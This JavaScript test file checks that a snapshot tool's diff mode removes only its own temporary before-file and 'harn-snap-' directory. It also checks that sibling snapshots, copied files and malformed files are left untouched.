test('stray-snapshot r4 L3: diff mode removes exactly the before-file it read and its harn-snap- parent, nothing else', () => {
  const repo = makeTempRepo(); const home = emptyHome(); const tmp = tmpBase()
  put(repo, 'u.txt')
  const b = take(repo, home, tmp)
  const parent = path.dirname(b.out.file)
  assert.ok(path.basename(parent).startsWith('harn-snap-'))
  const sibling = take(repo, home, tmp)  // a second snapshot in its own directory must survive the first's diff
  const d = diffOf(repo, b.out.file, home, tmp)
  assert.equal(d.res.status, 0, d.res.stderr)
  assert.ok(!fs.existsSync(b.out.file), 'the before-file must be gone after a successful diff')
  assert.ok(!fs.existsSync(parent), 'its harn-snap- parent must be gone too')
  assert.ok(fs.existsSync(sibling.out.file), 'another run\'s before-file is untouched')
  assert.ok(fs.existsSync(tmp), 'the temp directory itself is untouched')
})

test('stray-snapshot r4 L3: a before-file outside a harn-snap- directory, or a malformed one, is never deleted', () => {
  const repo = makeTempRepo(); const home = emptyHome(); const tmp = tmpBase()
  const b = take(repo, home, tmp)
  const copy = path.join(tmp, 'copy.json')
  fs.copyFileSync(b.out.file, copy)
  assert.equal(diffOf(repo, copy, home, tmp).res.status, 0)
  assert.ok(fs.existsSync(copy), 'a before-file not made by snapshot mode is left alone')
  const bad = path.join(fs.mkdtempSync(path.join(tmp, 'harn-snap-')), 'before.json')
  fs.writeFileSync(bad, 'not json')
  assert.notEqual(diffOf(repo, bad, home, tmp).res.status, 0)
  assert.ok(fs.existsSync(bad), 'a refused before-file is left for forensics')
})
